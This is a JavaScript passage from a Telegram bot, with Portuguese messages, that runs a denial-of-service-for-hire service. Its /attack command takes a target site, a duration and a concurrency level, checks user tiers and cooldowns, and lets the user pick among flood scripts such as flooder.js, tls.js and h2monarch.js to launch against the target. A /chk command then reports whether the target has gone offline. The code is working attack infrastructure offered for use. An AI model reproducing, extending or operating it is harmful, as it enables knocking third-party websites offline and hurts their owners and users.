bot.command('attack', async (ctx) => {
    const userId = ctx.from.id.toString();
    const now = Date.now();
    
    checkDefaultConfigExpiration();
    
    if (!checkCaptcha(userId)) {
        await showCaptcha(ctx, userId);
        return;
    }
    
    const user = authorizedUsers.get(userId);
    if (!user) return ctx.reply('❌ ACESSO NEGADO');
    
    if (!user.vip && !isAdmin(userId)) {
        const defaultSim = defaultConfig.simultaneous || 1;
        const defaultTime = defaultConfig.maxTime || 30;
        user.simultaneousLimit = defaultSim;
        user.maxTime = defaultTime;
        user.limit = defaultSim;
        saveUsers();
    }
    
    if (!user.vip) {
        const cooldownUntil = userCooldown.get(userId);
        if (cooldownUntil && now < cooldownUntil) {
            return ctx.reply('⏳ AGUARDE ' + Math.ceil((cooldownUntil - now) / 1000) + 's');
        }
    }
    
    const args = ctx.message.text.split(' ');
    if (args.length < 4) {
        return ctx.reply('/attack [ALVO] [TEMPO] [SIM]\nEx: /attack site.com 120 2');
    }
    
    let target = args[1];
    const time = parseInt(args[2]);
    const sim = parseInt(args[3]);
    
    target = normalizeUrl(target);
    
    const host = extractHost(target);
    if (blockedTargets.has(host)) return ctx.reply('🚫 ALVO BLOQUEADO PELA FORÇA SUPREMA');
    
    if (time > user.maxTime) return ctx.reply('⏱️ MAX: ' + user.maxTime + 's');
    if (sim > user.simultaneousLimit) return ctx.reply('🔄 MAX: ' + user.simultaneousLimit);
    
    const ip = await resolveIP(target);
    attackSessions.set(userId, { target, time, sim, ip, firstName: ctx.from.first_name, username: ctx.from.username || '' });
    
    const menu = Markup.inlineKeyboard([
        [Markup.button.callback('⚡KILL', `ojiva_GPZ_KILL_${userId}`), Markup.button.callback('🎯AR', `ojiva_GPZ_AR_${userId}`)],
        [Markup.button.callback('🌀WX', `ojiva_GPZ_WX_${userId}`), Markup.button.callback('🔒TLS', `ojiva_GPZ_TLS_${userId}`)],
        [Markup.button.callback('🔐TLS1', `ojiva_GPZ_TLS1_${userId}`), Markup.button.callback('☢️HTTP', `ojiva_GPZ_HTTP_${userId}`)],
        [Markup.button.callback('🌊FLOOD', `ojiva_GPZ_FLOODER_${userId}`), Markup.button.callback('🔥C3', `ojiva_GPZ_C3_${userId}`)],
        [Markup.button.callback('💀H2', `ojiva_GPZ_H2_${userId}`), Markup.button.callback('🚀H2M', `ojiva_GPZ_H2MONARCH_${userId}`)],
        [Markup.button.callback('❌ CANCELAR', `cancel_${userId}`)]
    ]);
    
    await ctx.reply(
        '🎯 <b>MIRA TRAVADA</b>\n\n' +
        '🌐 ' + target + '\n' +
        '📡 ' + ip + '\n' +
        '⏱️ ' + time + 's\n' +
        '🔄 ' + sim + '\n' +
        '⚡ RPS: ' + FIXED_RPS + ' | THREADS: ' + FIXED_THREADS + '\n\n' +
        'Selecione a ojiva:',
        { parse_mode: 'HTML', ...menu }
    );
});


bot.action(/ojiva_(.+)_(.+)/, async (ctx) => {
    const ojivaKey = ctx.match[1];
    const userId = ctx.match[2];
    if (ctx.from.id.toString() !== userId) return;
    
    const session = attackSessions.get(userId);
    if (!session) {
        await ctx.editMessageText('⏳ SESSAO EXPIRADA');
        return;
    }
    
    const ojivaMap = {
        'GPZ_KILL': { nome: 'KILL', script: 'gpzkill.js' },
        'GPZ_AR': { nome: 'GPZ-AR', script: 'ar.js' },
        'GPZ_WX': { nome: 'WX', script: 'gpzwx.js' },
        'GPZ_TLS': { nome: 'TLS', script: 'tls.js' },
        'GPZ_TLS1': { nome: 'TLS1', script: 'tls1.js' },
        'GPZ_HTTP': { nome: 'HTTP', script: 'http.js' },
        'GPZ_FLOODER': { nome: 'FLOODER', script: 'flooder.js' },
        'GPZ_C3': { nome: 'C3', script: 'c3.js' },
        'GPZ_H2': { nome: 'H2', script: 'c4.js' },
        'GPZ_H2MONARCH': { nome: 'H2-MONARCH', script: 'h2monarch.js' }
    };
    
    const ojivaConfig = ojivaMap[ojivaKey];
    if (!ojivaConfig) return;
    
    await ctx.deleteMessage().catch(() => {});
    await iniciarAtaques(ctx, userId, session, ojivaConfig);
    attackSessions.delete(userId);
});

bot.action(/cancel_(.+)/, async (ctx) => {
    const userId = ctx.match[1];
    attackSessions.delete(userId);
    await ctx.editMessageText('❌ OPERACAO CANCELADA');
});

bot.action(/stop_attack_(.+)/, async (ctx) => {
    const attackId = parseInt(ctx.match[1]);
    const attack = activeAttacks.get(attackId);
    if (!attack) {
        await ctx.editMessageText('❌ ATAQUE NAO ENCONTRADO');
        return;
    }
    if (ctx.from.id.toString() !== attack.userId && !isAdmin(ctx.from.id.toString())) return;
    if (stopSpecificAttack(attackId)) {
        await ctx.editMessageText('🛑 ATAQUE ABORTADO: ' + attack.target);
        panelMessages.delete(attackId);
    }
});


bot.command('chk', async (ctx) => {
    const userId = ctx.from.id.toString();
    
    if (!checkCaptcha(userId)) {
        await showCaptcha(ctx, userId);
        return;
    }
    
    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        return ctx.reply('📡 /chk [ALVO]\nEx: /chk site.com');
    }
    
    const target = args[1];
    const url = target.startsWith('http') ? target : `https://${target}`;
    
    await ctx.reply('⏳ Verificando ' + url + '...');
    
    const result = await checkTargetStatus(target);
    
    let msg = '📡 <b>STATUS DO ALVO</b>\n\n';
    msg += '🎯 <b>Alvo:</b> ' + url + '\n';
    msg += '📊 <b>Status:</b> ' + result.status + '\n';
    if (result.error) {
        msg += '❌ <b>Erro:</b> ' + result.error + '\n';
    }
    msg += '🔢 <b>Código HTTP:</b> ' + result.httpCode + '\n';
    msg += '━━━━━━━━━━━━━━━━━━━━\n';
    
    if (result.online) {
        msg += '✅ <b>Alvo:</b> ONLINE';
    } else {
        msg += '❌ <b>Alvo:</b> OFFLINE';
    }
    
    await ctx.replyWithHTML(msg);
});


